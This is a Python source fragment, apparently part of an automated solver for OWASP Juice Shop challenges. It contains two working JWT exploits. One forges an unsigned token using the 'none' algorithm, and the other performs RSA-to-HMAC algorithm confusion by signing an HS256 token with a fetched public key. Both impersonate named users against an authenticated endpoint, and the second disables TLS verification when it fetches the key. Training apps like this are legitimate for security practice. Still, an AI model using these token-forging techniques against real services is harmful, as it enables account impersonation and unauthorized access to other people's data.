
def access_with_none_algo(server, session):
    """
    Forge a JWT with 'none' algorithm and access a protected endpoint.
    """
    print('Forging JWT with None algorithm...'),
    try:
        # 1. Get a valid user email (we are admin usually)
        # We need to impersonate someone or just be admin?
        # Challenge: "Forge an unsigned JWT token"
        
        # Header: {"alg":"none","typ":"JWT"} -> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
        header = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0" # (without padding ideally)
        
        # Payload: {"email":"jwtn3d@juice-sh.op","iat":..., "data":...}
        # Challenge requires jwtn3d@juice-sh.op
        payload_data = '{"email":"jwtn3d@juice-sh.op"}'
        import base64
        payload = base64.urlsafe_b64encode(payload_data.encode()).decode().rstrip('=')
        
        # Signature: must be empty
        token = f"{header}.{payload}."
        
        # Use it
        headers = {'Authorization': f'Bearer {token}'}
        # Call an endpoint that requires auth? e.g. /rest/basket/1
        res = session.get(f'{server}/rest/basket/666', headers=headers)
        if res.status_code != 401:
             print('Success (maybe).')
        else:
             print('Failed.')
    except Exception as e:
        print(f"Warning: JWT None Algo failed: {e}")


def solve_forged_signed_jwt(server, session):
    """
    Forge a JWT by abusing the RSA public key as an HMAC secret (Algorithm Confusion).
    Target User: rsa_lord@juice-sh.op
    Algorithm: HS256
    Secret: The RSA Public Key (PEM)
    """
    print("Performing JWT Algorithm Confusion..."),
    try:
        # 1. Fetch the RSA Public Key (It is exposed/guessable)
        # Note: In some versions it's /assets/public/rsa_1024_pub.pem
        # Or we can deduce it from the "Unsigned JWT" hint?
        # Actually, let's try the common path.
        pubkey_url = f'{server}/assets/public/images/uploads/rsa_1024_pub.pem'
        # Actually, sometimes it's just served or we need to find it.
        # But for the solver we can try fetching it.
        # If not, we might need a stored copy.
        # Let's assume standard path or try a few.
        
        # NOTE: If we can't find it, we can't solve it purely blindly without 'Directory Listing' or 'File Leak'.
        # But often it is at /assets/public/images/uploads/rsa_1024_pub.pem
        
        # Let's try downloading it.
        # Since we use 'requests' separately, let's use the session.
        import requests
        # Bypass SSL verification just in case
        r = requests.get(pubkey_url, verify=False) 
        if not r.ok:
            # Fallback path?
            pass
            
        pub_pem = r.text
        
        if '-----BEGIN PUBLIC KEY-----' not in pub_pem:
             print("Skipping (Public Key not found).")
             return

        # 2. Forge Token
        # Header: {"alg":"HS256","typ":"JWT"}
        header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" 
        
        # Payload: {"email":"rsa_lord@juice-sh.op"}
        payload_data = '{"email":"rsa_lord@juice-sh.op"}'
        import base64
        import hmac
        import hashlib
        
        payload_b64 = base64.urlsafe_b64encode(payload_data.encode()).decode().rstrip('=')
        
        unsigned_token = f"{header}.{payload_b64}"
        
        # 3. Sign using PEM as secret
        signature = hmac.new(pub_pem.encode(), unsigned_token.encode(), hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
        
        forged_token = f"{unsigned_token}.{sig_b64}"
        
        # 4. Use it
        # Access any authenticated endpoint, generally /rest/basket/666 or check-login status?
        headers = {'Authorization': f'Bearer {forged_token}'}
        res = session.get(f'{server}/rest/basket/666', headers=headers)
        
        if res.status_code != 401:
            print("Success (Forged RSA as HS256).")
        else:
            print(f"Failed (Status {res.status_code}).")
            
    except Exception as e:
        print(f"Error solving forged signed jwt: {e}")
